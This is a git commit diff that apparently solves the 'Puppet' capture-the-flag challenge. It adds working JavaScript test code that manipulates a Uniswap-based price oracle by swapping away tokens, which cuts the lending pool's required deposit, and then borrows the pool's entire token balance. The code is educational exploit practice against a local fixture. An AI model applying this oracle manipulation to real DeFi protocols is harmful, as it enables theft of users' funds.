4fe6d1ec0bd2e13e93c0bcd5e89c50158a5bfd5f
Donneger Etienne <23462475+Krow10@users.noreply.github.com>
2022-07-05 11:38:50 -0400

    Solved Puppet chall

--- test/puppet/puppet.challenge.js
+++ test/puppet/puppet.challenge.js
@@ -102,7 +102,37 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            The price oracle for the lending pool is vulnerable since the ETH balance of the associated uniswap pair can be manipulated by an attacker with
+            sufficient funds.
+            In this case, the attacker can withdraw enough ETH from the uniswap contract such that the deposit required for borrowing all the lending pool's DVT
+            tokens is sufficiently low to be exploited.
+        */
+        this.uniswapAttackerInstance = await this.uniswapExchange.connect(attacker);
+        await (await this.token.connect(attacker)).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE); // Approve token transfer from uniswap exchange
+        let tx = await (await this.uniswapAttackerInstance.tokenToEthSwapInput( // Swap DVT tokens for ETH from the uniswap contract
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // Swap (almost) all attacker's token (not all since the solution checks for strict > token balance than pool's balance not >=)
+            calculateTokenToEthInputPrice(
+                ATTACKER_INITIAL_TOKEN_BALANCE, 
+                UNISWAP_INITIAL_TOKEN_RESERVE, 
+                UNISWAP_INITIAL_ETH_RESERVE
+            ).sub(ethers.utils.parseEther('1')), // Minimum amount of ETH uniswap should pay for token swap (with margin)  
+            (await ethers.provider.getBlock('latest')).timestamp * 2) // Deadline
+        ).wait();
+
+        const {buyer, tokens_sold, eth_bought} = tx.events.find(event => event.event == "EthPurchase").args;
+        console.log("[EthPurchase] Buyer", buyer, "sold", ethers.utils.formatEther(tokens_sold), "DVT tokens for", ethers.utils.formatEther(eth_bought), "ETH");
+        console.log(
+            "[DepositRequired] Deposit required for withdrawing all DVT tokens from lending pool is now", 
+            ethers.utils.formatEther(await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)), "ETH"
+        );
+
+        expect(
+            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        ).to.be.lt(await ethers.provider.getBalance(attacker.address)); // Attacker should now have enough ETH for the deposit to withdraw all the pool's DVT tokens
+
+        this.poolAttackerInstance = await this.lendingPool.connect(attacker);
+        this.poolAttackerInstance.borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ATTACKER_INITIAL_ETH_BALANCE});
     });
 
     after(async function () {
